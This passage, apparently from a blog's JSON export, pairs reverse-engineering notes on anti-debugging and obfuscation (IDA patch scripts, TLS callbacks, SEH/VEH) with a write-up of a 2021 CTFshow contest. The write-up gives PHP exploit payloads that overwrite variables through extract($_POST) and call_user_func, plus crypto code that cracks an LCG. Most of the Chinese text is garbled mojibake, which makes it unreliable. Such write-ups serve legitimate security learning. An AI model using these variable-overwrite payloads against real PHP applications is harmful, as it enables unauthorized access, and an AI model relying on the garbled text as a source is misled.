addr+=ItemSize(addr)dejunkcode(0x00401000,0x00411E40) â€‹ SMCSMCï¼ˆè‡ªä¿®æ”¹ä»£ç ï¼ŒSelf-Modifying Codeï¼‰ï¼Œå°±æ˜¯åœ¨çœŸæ­£æ‰§è¡ŒæŸä¸€æ®µä»£ç æ—¶ï¼Œç¨‹åºä¼šå¯¹è‡ªèº«çš„è¯¥æ®µä»£ç è¿›è¡Œè‡ªä¿®æ”¹ï¼Œåªæœ‰åœ¨ä¿®æ”¹åçš„ä»£ç æ‰æ˜¯å¯æ±‡ç¼–ï¼Œå¯æ‰§è¡Œçš„ã€‚åœ¨ç¨‹åºæœªå¯¹è¯¥æ®µä»£ç è¿›è¡Œä¿®æ”¹ä¹‹å‰ï¼Œåœ¨é™æ€åˆ†æçŠ¶æ€ä¸‹ï¼Œå‡æ˜¯ä¸å¯è¯»çš„å­—èŠ‚ç ï¼ŒIDAä¹‹ç±»çš„åæ±‡ç¼–å™¨æ— æ³•è¯†åˆ«ç¨‹åºçš„æ­£å¸¸é€»è¾‘ã€‚æ˜¯ä¸€ç§åè°ƒè¯•ä»£ç æŠ€æœ¯ã€‚ è¿˜åŸæ–¹æ³• é¦–å…ˆç¡®å®šéœ€è¦åŠ å¯†çš„ä»£ç éƒ¨åˆ†ï¼› é€šè¿‡vsæŸ¥çœ‹åæ±‡ç¼–ï¼ˆæˆ–è€…ODã€IDAç­‰ï¼‰å¯ä»¥ç¡®å®šå¯¹åº”éƒ¨åˆ†çš„åæ±‡ç¼–ä»£ç ï¼› å°†è¿™æ®µä»£ç æ‰‹å·¥ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨è¦†ç›–ä¸ºåŠ å¯†åçš„æ•°æ®ï¼› ç¨‹åºæ‰§è¡Œæ—¶åˆ™è¿è¡Œäº‹å…ˆå†™å¥½çš„ä»£ç å…ˆè¿›è¡Œè§£å¯†å†è¿è¡Œã€‚ å‚è€ƒ https://blog.csdn.net/qq_41923479/article/details/80377708https://blog.csdn.net/palmer9/article/details/105034093 è„šæœ¬ IDA - File - Script file 1234567891011#include &lt;idc.idc&gt;static main()&#123; auto addr = 0x00401216; auto i = 0; for(i=0;i&lt;=0x43E;i++) &#123; PatchByte(addr+i,Byte(addr+i)^Byte(0x00409080+i)); &#125;&#125; â€‹ MOVæ··æ·†å‰‘æ¡¥å¤§å­¦çš„Stephen Dolanè¯æ˜äº†x86çš„movæŒ‡ä»¤å¯ä»¥å®Œæˆå‡ ä¹æ‰€æœ‰åŠŸèƒ½äº†ï¼ˆå¯èƒ½è¿˜éœ€è¦jmpï¼‰ï¼Œå…¶ä»–æŒ‡ä»¤éƒ½æ˜¯â€œå¤šä½™çš„â€ã€‚è¿™ç§æ··æ·†çš„ç‰¹å¾å°±æ˜¯ï¼šæ±‡ç¼–ä»£ç çš„æ±‡ç¼–æŒ‡ä»¤å‡ ä¹å…¨éƒ¨å°±æ˜¯MOVã€‚ 1ã€ å­—ç¬¦ä¸²çš„æœç´¢æ˜¯ç»™æˆ‘ä»¬æœ€å¥½çš„æç¤ºã€‚ 2ã€ MOVæ··æ·†æ˜¯ä¸ä¼šæ··æ·†å‡½æ•°çš„é€»è¾‘çš„ã€‚å› æ­¤å‡½æ•°çš„é€»è¾‘è¿˜æ˜¯ä¸å˜çš„ã€‚ 3ã€ å¤§å¤šæ•°æ±‡ç¼–ä»£ç çš„æ„æ€æ˜¯å¯ä»¥çŒœæµ‹çš„ã€‚å¯ä»¥å¤§æ¦‚æ¨æµ‹å‡ºå…·ä½“æ“ä½œäº†ä»€ä¹ˆã€‚ åœ¨è¿™é‡Œæä¾›ä¸€ä¸ªå¼€æºçš„å·¥å…·ï¼Œæ˜¯é’ˆå¯¹è¿™çš„MOVæ··æ·†çš„å·¥å…·ï¼šhttps://github.com/kirschju/demovfuscatorï¼Œè¿™ä¸ªå·¥å…·å¯ä»¥å¾ˆå¥½çš„å¸®åŠ©æˆ‘ä»¬åˆ†æMOVæ··æ·†ã€‚ 123456789101112131415161718192021222324252627282930#include&lt;idc.idc&gt;static isAscii(p)&#123; if(Byte(p)&lt;=&#x27;9&#x27; &amp;&amp; Byte(p)&gt;=&#x27;0&#x27;) return 1; if(Byte(p)&lt;=&#x27;z&#x27; &amp;&amp; Byte(p)&gt;=&#x27;a&#x27;) return 1; if(Byte(p)&lt;=&#x27;Z&#x27; &amp;&amp; Byte(p)&gt;=&#x27;A&#x27;) return 1; if(Byte(p)==&#x27;&#125;&#x27; || Byte(p)==&#x27;&#123;&#x27; || Byte(p)==&#x27;_&#x27; || Byte(p)==&#x27;@&#x27; || Byte(p)==&#x27;!&#x27; ||Byte(p)==&#x27;#&#x27; || Byte(p)==&#x27;&amp;&#x27; || Byte(p)==&#x27;*&#x27;) return 1; return 0;&#125;static main()&#123; auto start=0x0804824C,end=0x08053FA9; //ä»£ç æ®µèµ·æ­¢åœ°å€ auto point=start; auto str=&quot;&quot;; while(point&lt;=end) &#123; if(isAscii(point) &amp;&amp; Byte(point+1)==0 &amp;&amp; Byte(point+2)==0 &amp;&amp; Byte(point+3)==0) &#123; Message(&quot;%X %c\\n&quot;,point,Byte(point)); str=str+Byte(point); &#125; point=point+1; &#125; Message(&quot;%s\\n&quot;,str);&#125; â€‹ OLLVMæ··æ·†ï¼ˆLLVMï¼‰ D810æ’ä»¶ https://github.com/joydo/d810 åŸºäºSnowGirlsçš„deflatï¼Œåˆ©ç”¨angræ¡†æ¶å®ç°å»é™¤æ§åˆ¶æµå¹³å¦åŒ–ã€‚ python deflat.py -f check_passwd_x8664_flat --addr 0x400530 LLVMå¤šç§æ ¼å¼ xx.c ï¼ˆæºä»£ç ï¼‰ xx.ll ï¼ˆLLVMå­—èŠ‚ç çš„æ–‡æœ¬è¡¨ç¤ºï¼‰ xx.s ï¼ˆæœºå™¨æ±‡ç¼–ç è¡¨ç¤ºçš„æ±‡ç¼–æ–‡ä»¶ï¼‰ xx.bc ï¼ˆLLVMå­—èŠ‚ç çš„äºŒè¿›åˆ¶å½¢å¼ï¼‰ xx.out ï¼ˆå¯æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ å¸¸ç”¨è½¬æ¢ï¼š 1234567clang test.bc -o testllvm-dis test.bc -o test.llllvm-as test.ll -o test.bcllc test.bc -o test.sgcc hello.s -o hellogcc -c -fPIE hello.s -o hello â€‹ TLSThreadLocalStorage(TLS)ï¼Œæ˜¯Windowsä¸ºè§£å†³ä¸€ä¸ªè¿›ç¨‹ä¸­å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®å…¨å±€å˜é‡è€Œæä¾›çš„æœºåˆ¶ã€‚TLSå¯ä»¥ç®€å•åœ°ç”±æ“ä½œç³»ç»Ÿä»£ä¸ºå®Œæˆæ•´ä¸ªäº’æ–¥è¿‡ç¨‹ï¼Œä¹Ÿå¯ä»¥ç”±ç”¨æˆ·è‡ªå·±ç¼–å†™æ§åˆ¶ä¿¡å·é‡çš„å‡½æ•°ã€‚å½“è¿›ç¨‹ä¸­çš„çº¿ç¨‹è®¿é—®é¢„å…ˆåˆ¶å®šçš„å†…å­˜ç©ºé—´æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šè°ƒç”¨ç³»ç»Ÿé»˜è®¤çš„æˆ–ç”¨æˆ·è‡ªå®šä¹‰çš„ä¿¡å·é‡å‡½æ•°ï¼Œä¿è¯æ•°æ®çš„å®Œæ•´æ€§ä¸æ­£ç¡®æ€§ã€‚ è€Œå½“Coderé€‰æ‹©ä½¿ç”¨è‡ªå·±ç¼–å†™çš„ä¿¡å·é‡å‡½æ•°æ—¶ï¼Œåœ¨åº”ç”¨ç¨‹åºåˆå§‹åŒ–é˜¶æ®µï¼Œç³»ç»Ÿå°†è¦è°ƒç”¨ä¸€ä¸ªç”±ç”¨æˆ·ç¼–å†™çš„åˆå§‹åŒ–å‡½æ•°ä»¥å®Œæˆä¿¡å·é‡çš„åˆå§‹åŒ–ä»¥åŠå…¶ä»–çš„ä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚æ­¤è°ƒç”¨å¿…é¡»åœ¨ç¨‹åºçœŸæ­£å¼€å§‹æ‰§è¡Œåˆ°å…¥å£ç‚¹ä¹‹å‰å°±å®Œæˆï¼Œä»¥ä¿è¯ç¨‹åºæ‰§è¡Œçš„æ­£ç¡®æ€§ã€‚ TLSå›è°ƒå‡½æ•°çš„æ‰§è¡Œï¼Œä¸æ•°æ®çš„åˆå§‹åŒ–ï¼Œéƒ½åœ¨ç¨‹åºå…¥å£ç‚¹ä¹‹å‰æ‰§è¡Œï¼ŒTLSæ˜¯æ•´ä¸ªç¨‹åºæœ€æ—©è¿è¡Œçš„åœ°æ–¹ï¼Œæ‰€ä»¥å¯ä»¥ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæ‰§è¡Œä¸€äº›ç‰¹æ®Šæ“ä½œã€‚ç„¶ååœ¨æœ€åç¨‹åºé€€å‡ºæ—¶è¿˜ä¼šè°ƒç”¨ä¸€æ¬¡ã€‚ TLSåè°ƒè¯•ï¼š å¾€å®šä¹‰çš„TLSå‡½æ•°é‡Œå†™ä»£ç ã€‚ ODè°ƒè¯•ç¨‹åºçš„æ—¶å€™ï¼Œè¦å…ˆæ‰¾åˆ°ç¨‹åºçš„å…¥å£ç‚¹ï¼Œè·Ÿæ‹¿ç€é’¥åŒ™å¼€é—¨ä¸€æ ·ï¼Œæ‰¾åˆ°å­”ï¼Œæ‰èƒ½æ’é’¥åŒ™ã€‚TLSå›è°ƒå‡½æ•°ï¼Œç”±äºå¯ä»¥åœ¨ç¨‹åºä¸­æœ€æ—©è¿è¡Œçš„æ—¶å€™æ‰§è¡Œï¼Œå¯ä»¥æŠŠåœ¨è°ƒè¯•å™¨æ£€æµ‹åˆ°å…¥å£ç‚¹ä¹‹å‰ï¼Œå®ƒè‡ªå·±æ£€æµ‹æ˜¯å¦å­˜åœ¨è°ƒè¯•ã€‚ä¾‹å¦‚ï¼Œæ£€æµ‹åŠ è½½ç¯å¢ƒæ˜¯ä¸æ˜¯â€œOllyDbgâ€ç­‰ã€‚ è§£æ³•ï¼š å¯ä»¥é€šè¿‡patchæ‰TLSå›è°ƒæ¥ååè°ƒè¯•ï¼Œä½†æ—¢ç„¶å®ƒç”¨åˆ°äº†isDebuggerPresentï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡nopå¡«å……æ¥è®©è°ƒè¯•èƒ½å¤Ÿç»§ç»­è¿è¡Œã€‚ â€‹ å¼‚å¸¸å¼‚å¸¸è§¦å‘åçš„é¡ºåº ä¼˜å…ˆé¡ºåºï¼šè°ƒè¯•å™¨ &gt; VEH &gt; SEH SEHå¦‚æœç¨‹åºå¼•å‘äº†å¼‚å¸¸ï¼Œç¨‹åºå°†åˆ©ç”¨Windowsçš„ä¸€ç§å¼‚å¸¸å¤„ç†æœºåˆ¶ SEHï¼ˆStructured Exception Handlingï¼‰æœºåˆ¶å¤„ç†å¼‚å¸¸ï¼Œåœ¨å¤„ç†è¿‡ç¨‹ä¸­å¯¹ç¨‹åºè¿›è¡Œä¸€å®šçš„ä¿®æ”¹ã€‚å¸¸è§å½¢å¼ï¼š__try&#123;...&#125; __except(filter)&#123;...&#125;ã€‚ ç”±äºSEHä¸­çš„å¾ˆå¤šä»£ç ä¸ä¼šè¢«IDAåç¼–è¯‘å‡ºæ¥ï¼Œæ‰€ä»¥å®ƒå¸¸å¸¸è¢«ç”¨æ¥åé™æ€åˆ†æï¼šç¨‹åºå‘˜åœ¨tryå—ä¸­çš„æŸäº›æƒ…å†µä¸‹æ•…æ„è§¦å‘ä¸€äº›å¼‚å¸¸ï¼Œæ¥æ‰§è¡Œexceptå—ä¸­ä»–ä»¬æƒ³è¦éšè—èµ·æ¥çš„ä»£ç ã€‚ ç®€è€Œè¨€ä¹‹ï¼Œå°±åƒå®ƒä»¬çš„åå­—ä¸€æ ·ï¼Œç¨‹åºå…ˆæ‰§è¡Œtryå—ä¸­çš„é€»è¾‘ï¼Œå¦‚æœtryä¸­äº§ç”Ÿäº†ä¸€äº›å¼‚å¸¸çš„æƒ…å†µï¼ˆå¯ä»¥ç®€å•ç†è§£ä¸ºç¨‹åºå‘ç”Ÿäº†ä¸€äº›æ„å¤–ï¼‰ï¼Œå°±ä¼šæ‰§è¡Œexceptä¸­çš„ä»£ç æ¥å¤„ç†å¼‚å¸¸ï¼›åä¹‹ï¼Œå¦‚æœtryå—ä¸­æ²¡æœ‰äº§ç”Ÿå¼‚å¸¸ï¼Œexceptå—å°±ä¸ä¼šè¢«æ‰§è¡Œã€‚ â€‹ VEHVEHï¼Œå‘é‡åŒ–å¼‚å¸¸å¤„ç†ï¼ˆVectored Exception Handlingï¼‰ï¼Œå®ƒä¼˜å…ˆäºSEHæ‰§è¡Œï¼Œå½“VEHå¤„ç†äº†å¼‚å¸¸å°±ä¸ä¼šæäº¤ç»™SEHã€‚ VEHæ˜¯å…¨å±€é“¾è¡¨ï¼Œæ¯ä¸ªVEHæŒ‰é¡ºåºè¢«è°ƒç”¨ï¼ŒVEHå¯è¿”å›ä¸¤ä¸ªå€¼ï¼šEXCEPTION_CONTINUE_SEARCHã€EXCEPTION_CONTINUE_EXECUTIONã€‚EXCEPTION_CONTINUE_SEARCHæŠŠå¼‚å¸¸äº¤ç»™ä¸‹ä¸€ä¸ªVEHå¤„ç†ï¼Œå³ä¸å¤„ç†ï¼›EXCEPTION_CONTINUE_EXECUTION åˆ™è¡¨ç¤ºå¤„ç†è¯¥å¼‚å¸¸ã€‚ å¯ä»¥é€šè¿‡AddVectoredExceptionHandlerå‡½æ•°å’ŒRemoveVectoredExceptionHandlerå‡½æ•°è¿›è¡Œæ’å…¥VEHå’Œç§»é™¤VEHã€‚ SEHæ˜¯åŸºäºçº¿ç¨‹çš„ï¼Œè€ŒVEHæ˜¯åŸºäºè¿›ç¨‹çš„ã€‚ å› ä¸ºå¾ˆæ¸…æ¥šçš„å¯ä»¥çœ‹åˆ°SEHçš„æ•°æ®ç»“æ„æ˜¯ä¿å­˜åœ¨æ ˆç©ºé—´çš„ï¼Œç›´æ¥åœ¨å‡½æ•°ä½“å†…ç”¨pushæ¥å¤„ç†ï¼Œè€ŒVEHæ˜¯ä»¥åŒé“¾è¡¨çš„å½¢å¼ä¿å­˜åœ¨å †é‡Œé¢ã€‚","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"åè°ƒè¯•","slug":"åè°ƒè¯•","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"}],"author":"Lazzaro"},{"title":"CTFshow å¤§å‰å¤§åˆ©æ¯DJBCTF","slug":"match-CTFshow-å¤§å‰å¤§åˆ©æ¯DJBCTF","date":"2021-01-24T13:28:29.000Z","updated":"2021-04-27T11:54:43.213Z","comments":true,"path":"2021/01/24/match-CTFshow-å¤§å‰å¤§åˆ©æ¯DJBCTF/","permalink":"https://lazzzaro.github.io/2021/01/24/match-CTFshow-%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AFDJBCTF/","excerpt":"","text":"æ¯”èµ›ï¼šCTFshow å¤§å‰å¤§åˆ©æ¯ç®€ç§°ï¼šå¤§å‰æ¯ DJBå¹³å°ï¼šhttps://ctf.showå¼€å§‹ï¼š2021/1/23 9:00ç»“æŸï¼š2021/1/24 22:00è§„åˆ™ï¼š1 æ¯”èµ›æœŸé—´å¯ä»¥éšæ„è®¨è®ºï¼Œwpé¡»åœ¨æ¯”èµ›ç»“æŸåå‘å¸ƒï¼Œwpç»Ÿä¸€å‘å¸ƒåœ°å€ï¼šwp.ctf.show2 å…¬å¹³ç«æŠ€ï¼Œç‹¬ç«‹æ¯”èµ›3 æœåŠ¡å™¨ä¸è¦çˆ†ç ´ï¼Œä¸è¦æ”»å‡»æœåŠ¡å™¨ï¼Œä¸è¦æ‰«æ!!!4 å¥–å“ï¼šæ–°æ˜¥æœˆé¥¼ä¸€ä»½ï¼Œå•é¡¹å‰ä¸‰å®šåˆ¶é‡å­æ°´æ¯ä¸€ä¸ª5 é¢˜ç›®å¾é›†ï¼šhttps://shimo.im/docs/YP3tVqPJTxD6jhdt å‡ºé¢˜ï¼š4 crypto + 1 reverse WEBveryphp 123456789101112131415161718192021222324252627282930313233&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;config.php&quot;);class qwq&#123; function __wakeup()&#123; die(&quot;Access Denied!&quot;); &#125; static function oao()&#123; show_source(&quot;config.php&quot;); &#125;&#125;$str = file_get_contents(&quot;php://input&quot;);if(preg_match(&#x27;/\\`|\\_|\\.|%|\\*|\\~|\\^|\\&#x27;|\\&quot;|\\;|\\(|\\)|\\]|g|e|l|i|\\//is&#x27;,$str))&#123; die(&quot;I am sorry but you have to leave.&quot;);&#125;else&#123; extract($_POST);&#125;if(isset($shaw_root))&#123; if(preg_match(&#x27;/^\\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\\D*?(abc.*?)p(hp)*\\@R(s|r).$/&#x27;, $shaw_root)&amp;&amp; strlen($shaw_root)===29)&#123; echo $hint; &#125;else&#123; echo &quot;Almost there.&quot;.&quot;&lt;br&gt;&quot;; &#125;&#125;else&#123; echo &quot;&lt;br&gt;&quot;.&quot;Input correct parameters&quot;.&quot;&lt;br&gt;&quot;; die();&#125;if($ans===$SecretNumber)&#123; echo &quot;&lt;br&gt;&quot;.&quot;Congratulations!&quot;.&quot;&lt;br&gt;&quot;; call_user_func($my_ans);&#125; extract($_POST)ä»¥POSTæ–¹å¼ä¼ å…¥å˜é‡ã€‚ï¼ˆç¬¬ä¸€ä¸ªpreg_matchå†…çš„ç‰¹æ®Šå­—ç¬¦å®Œå…¨æ— è¿‡æ»¤ä½œç”¨ï¼Œè¿‡æ»¤çš„æ˜¯$strå˜é‡ã€‚ï¼‰ ç¬¬ä¸€å±‚ï¼Œä¼ å…¥$shaw_rootï¼ˆå¦‚æœä¸Šé¢preg_matchè¿‡æ»¤æ­£å¸¸ï¼Œåˆ™ä¸èƒ½ä½¿ç”¨_ï¼Œåˆ©ç”¨PHPç‰¹æ€§ï¼Œå½“å‚æ•°åä¸­å«+/[/./ç©ºæ ¼è¿™äº›å­—ç¬¦æ—¶ä¼šè¢«è§£æä¸º_ï¼Œä¼ å…¥shaw[root=1ï¼‰ï¼›æ¥ç€åŒ¹é…preg_matchå†…æ­£åˆ™è¡¨è¾¾å¼ï¼Œåˆ©ç”¨ https://regex101.com/ å¯è¯•å‡ºåŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œä½¿ç”¨-a9&lt;b&gt;xxxxxx&gt;&gt;&gt;&gt;zzabcdphp@Rsxï¼Œå¾—åˆ°hintï¼š &gt;Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)==166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)===5 ç¬¬äºŒå±‚ï¼Œå®Œå…¨æ— éœ€ç†ä¼šhintå†…å®¹ï¼Œç…§æ ·åˆ©ç”¨extract($_POST)ä»¥POSTæ–¹å¼ä¼ å…¥å‚æ•°ans=1å’ŒSecretNumber=1ï¼Œè¦†ç›–åŸå§‹å˜é‡å€¼ï¼Œå†ç»™call_user_funcä¼ å…¥my_anså˜é‡æ‰§è¡Œè‡ªå®šä¹‰å‡½æ•°ï¼Œç»“åˆç»™å‡ºçš„ç±»é™æ€æ–¹æ³•ï¼Œä¼ my_ans=qwq:oaoå¾—flagã€‚ payload: shaw_root=-a9&lt;b&gt;xxxxxx&gt;&gt;&gt;&gt;zzabcdphp@Rsx&amp;ans=1&amp;SecretNumber=1&amp;my_ans=qwq::oao â€‹ spaceman 12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);highlight_file(__FILE__);class spaceman&#123; public $username; public $password; public function __construct($username,$password) &#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;ctfshowvip&#x27;) &#123; include(&quot;flag.php&quot;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125;&#125;function filter($string)&#123; return str_replace(&#x27;ctfshowup&#x27;,&#x27;ctfshow&#x27;,$string);&#125;$str = file_get_contents(&quot;php://input&quot;);if(preg_match(&#x27;/\\_|\\.|\\]|\\[/is&#x27;,$str))&#123; die(&quot;I am sorry but you have to leave.&quot;);&#125;else&#123; extract($_POST);&#125;$ser = filter(serialize(new spaceman($user_name,$pass_word)));$test = unserialize($ser);?&gt; åº”è¯¥æ˜¯å‡ºé¢˜å¤±è¯¯ï¼Œæœ¬æƒ³è€ƒååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œç»“æœå˜æˆå¾ˆç®€å•çš„éé¢„æœŸã€‚ åŒæ ·ï¼Œextract($_POST)ä»¥POSTæ–¹å¼ä¼ å…¥å˜é‡ã€‚ï¼ˆç¬¬ä¸€ä¸ªpreg_matchå†…çš„ç‰¹æ®Šå­—ç¬¦å®Œå…¨æ— è¿‡æ»¤ä½œç”¨ï¼Œè¿‡æ»¤çš„æ˜¯$strå˜é‡ã€‚ï¼‰ ä¼ å…¥user_name=1&amp;pass_word=ctfshowvipå³å¾—flagã€‚ â€‹ MISCåå…«èˆ¬å…µå™¨ åˆ€ã€æªã€å‰‘ã€æˆŸã€æ–§ã€é’ºã€é’©ã€å‰ã€é­ã€é”ã€é”¤ã€æˆˆã€é•‹ã€æ£ã€æ§Šã€æ£’ã€çŸ›ã€è€™ hint1: JPHS hint2: ç”¨Notepad++æ‰“å¼€è¯•è¯•ï¼Ÿ hint3: å‰åç§å…µå™¨å¯¹åº”10è¿›åˆ¶ï¼Œåå…«ç§å¯¹åº”8è¿›åˆ¶ 18å¼ å›¾ï¼Œæ ¹æ®hint1ï¼Œç”¨jphs05éšå†™å·¥å…·åˆ†åˆ«ä»18å¼ å›¾åˆ†åˆ«æå–å‡ºtxtæ–‡ä»¶ï¼ˆç©ºå¯†ç ï¼‰ï¼Œ å†æ ¹æ®hint2åˆ†åˆ«æŠŠæ¯ä¸ªtxtæ–‡ä»¶æœ€åä¸€è¡Œçš„æ•°å­—éƒ½æ‘˜å‡ºï¼Œå‰åä¸ªè¿æ¥ååè¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼Œåå…«ä¸ªè¿æ¥åå…«è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²è¿æ¥èµ·æ¥ä¸ºflagã€‚ â€‹ è¯·é—®å¤§å‰æ¯çš„ç­¾åˆ°æ˜¯åœ¨è¿™é‡Œç­¾å— flagä¸ºå…¨éƒ¨å°å†™å­—æ¯ï¼Œæ²¡æœ‰ç©ºæ ¼ ä¸€å¼ äºŒç»´ç ï¼ŒæŒ‰ç…§æ‰«ç å†…å®¹èƒ½åˆ†ç¦»å‡ºæå–å‡º4å¼ äºŒç»´ç ï¼Œå†…å®¹æœ‰æç¤ºæ„ä¹‰ï¼Œ ç¬¬2å¼ å›¾çš„å†…å®¹ä¸ºè¿˜è¦å¾€å‰èµ°......æ˜¯ä¸æ˜¯åœ¨è¿™ä¸ªè·¯å£è½¬å¼¯å‘¢ï¼Ÿï¼Œæœ‰é—®é¢˜ï¼Œä¸ŠstegsolveæŸ¥çœ‹ï¼Œåœ¨Random colour mapå°±èƒ½çœ‹å‡ºç«¯å€ªï¼š çŒªåœˆå¯†ç å¯¹ç…§è§£å¯†å¾—flagã€‚ â€‹ ç‰›å¹´å¤§å‰ é¢˜ç›®ä¸‹è½½ è“å¥äº‘ä¸‹è½½åœ°å€ï¼šhttps://wws.lanzous.com/i1Ac0jybrvc ç™¾åº¦äº‘ä¸‹è½½åœ°å€ï¼š https://pan.baidu.com/s/14EXw7U4w0Am0oP_xRXfbqQ æå–ç ï¼šns2k hint1: ä¸è¦æ ¼å¼åŒ–å“Ÿï¼Œçœ‹çœ‹å¼•å¯¼æ‰‡åŒºæ˜¯ä¸æ˜¯ä¸¢ä¸œè¥¿äº† hint2: å‹ç¼©åŒ…å¯†ç åœ¨å›¾ç‰‡æ–‡ä»¶å¤´é‡Œ vhdç£ç›˜æ–‡ä»¶ï¼Œç”¨DiskGeniusè£…è½½ï¼Œä¿®å¤ç£ç›˜ï¼Œèƒ½æå–å‡º!lag.7zå’Œç‰›å¹´å¤§å‰.pngä¸¤ä¸ªæ–‡ä»¶ï¼Œæ ¹æ®hint2ï¼Œ7zå‹ç¼©åŒ…å¯†ç ä¸ºpngæ–‡ä»¶å¤´89504E47ï¼Œè§£å‹å¾—flagã€‚ â€‹ æ‹¼å›¾v2.0 æœ‰æ‰‹å°±è¡Œï¼Œæ²¡æ‰‹çš„å¯ä»¥æ‹¿çœ¼ç›å»çª æ‰“å¼€ç¯å¢ƒï¼Œå¸¦æ—‹è½¬çš„æ‹¼å›¾ï¼Œgapsä¸æ–¹ä¾¿ï¼Œçº¯æ‰‹å·¥ä¸Šã€‚ â€‹ AA86 åœ¨ä¸€å°æ—§ç”µè„‘ä¸Šï¼ˆå¤§çº¦åœ¨16ä½æ“ä½œç³»ç»Ÿè¿˜èƒ½è·‘çš„å¹´ä»£ï¼‰å‘ç°äº†è¿™ä¸ªæ–‡ä»¶ï¼ŒæŒ–æ˜å®ƒçš„ç§˜å¯† hint: è¯·ä»”ç»†é˜…è¯»é¢˜ç›®æè¿°(5æ¯›ä¸€æ¡ï¼Œå»æ‰æ‹¬å·) æ ¹æ®æç¤ºå…³é”®æ˜¯16ä½æ“ä½œç³»ç»Ÿã€‚ Googleæœç´¢DOS AA86ï¼Œåœ¨ç¬¬2æ¡ç»“æœå¯å‘ç°AA86æ–‡ä»¶ç¼–ç è¯´æ˜ï¼š Aa86 is a .COM file encoder by Yosuke Hasegawa that encodes binaries using only symbols characters, with a decoder. æŠŠæ–‡ä»¶åŠ ä¸Šåç¼€.COMï¼Œæ‰¾ä¸ªMSDOSåœ¨è™šæ‹Ÿæœºå®‰è£…ï¼Œå†è¿è¡ŒAA86.COMå¾—flagã€‚ â€‹ CRYPTOeasysignin 1234567891011121314151617181920212223242526272829from Crypto.Util.number import getPrime, isPrime, bytes_to_longfrom random import getrandbitsfrom secret import flagdef genpq(k): while True: p = getPrime((k + 3) // 4) q = getPrime((k + 3) // 4) if ((p ** 2) * (q ** 2)).bit_length() == k: return (p, q)def genseq(t, k): x = getrandbits(k) y = getrandbits(k) r = [] r += [pow(x * getrandbits(k)+y, pow(getrandbits(k), t - 1, t), t)] for i in range(len(flag)): r += [pow(x * r[i] +y, pow(getrandbits(k), t - 1, t), t)] return r(p, q) = genpq(2021)e = getPrime(0x0123)r = [genseq(p, p.bit_length() // 4), genseq(q, q.bit_length() // 4), genseq(e, e.bit_length() // 4)]c = pow(bytes_to_long(flag), e, 2021 * p * q)out = open(&#x27;output.txt&#x27;,&#x27;w&#x27;)out.write(str(r) + &quot;\\n&quot;)out.write(str(c) + &quot;\\n&quot;)out.close() å¥—LCGå£³çš„RSAã€‚ é¦–å…ˆè§£å†³LCGé—®é¢˜ï¼Œ è§‚å¯Ÿ genseq() å‡½æ•°ï¼Œå‘ç° pow(getrandbits(k), t - 1, t) ä¸ºæ··æ·†å¼ï¼Œç”±äºä¼ å…¥çš„ $t$ ä¸ºè´¨æ•°ï¼Œå¯æ ¹æ®è´¹é©¬å°å®šç†åŒ–ä¸º1ï¼Œå†æŒ‰ç…§æ­£å¸¸æ–¹å¼ç”Ÿæˆé€’å½’çŠ¶æ€æ•°ç»„ $r_{i+1}=(x \\cdot r_i+y) \\pmod t$ï¼Œå…¶ä¸­ä¹˜æ•° $x$ã€å¢é‡$y$ã€æ¨¡æ•°$t$ å‡æœªçŸ¥ã€‚ ä¸‰æ¬¡è°ƒç”¨genseq()å‡½æ•°ï¼Œäº§ç”Ÿä»¥ $p,q,e$ ä¸ºæ¨¡æ•°çš„é€’å½’çŠ¶æ€æ•°ç»„ $r_p,r_q,r_e$ï¼Œåˆ©ç”¨ä¸‰ç§å€¼æœªçŸ¥æƒ…å†µä¸‹çš„æ”»å‡»æ–¹å¼ï¼Œæ±‚å‡º $p,q,e$ å€¼ã€‚ å†è§£ç®€å•RSAå³å¾—flagã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142from functools import reducefrom math import gcddef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&#x27;modular inverse does not exist&#x27;) else: return x % mdef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus)rp = []rq = []re = []xp, yp, p = crack_unknown_modulus(rp)xq, yq, q = crack_unknown_modulus(rq)xe, ye, e = crack_unknown_modulus(re)print(p)print(q)print(e)#RSAæ­¥éª¤ç•¥ â€‹ luckybase baseã®è¯•ç‚¼ hint: b64decode(â€˜452/4520â€™)=â€™ã¿ã´â€™ 123456789101112131415161718#!/usr/bin/env python3.8from base64 import b64encodefrom random import randint, randomfrom os import getcwdprint(&#x27;\\n\\n&#x27;)print(open(getcwd() + &#x27;/&#x27; + __file__, 